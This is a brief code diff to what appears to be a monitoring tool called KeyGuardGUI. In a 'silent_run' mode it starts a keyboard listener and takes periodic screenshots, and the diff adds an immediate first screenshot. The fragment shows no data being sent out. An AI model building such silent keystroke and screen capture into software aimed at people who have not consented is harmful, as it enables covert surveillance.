@@ -86,11 +86,14 @@ class KeyGuardGUI:
         def silent_run():
             self.agent.running = True
             self.agent.start_keyboard_listener()
+            
+            # Take immediate initial screenshot and status update
+            self.agent.capture_screenshot()
             self.agent.update_device_status()
             
             import time
-            last_screenshot = 0
-            last_status = 0
+            last_screenshot = time.time()
+            last_status = time.time()
             
             while self.agent.running:
                 current_time = time.time()
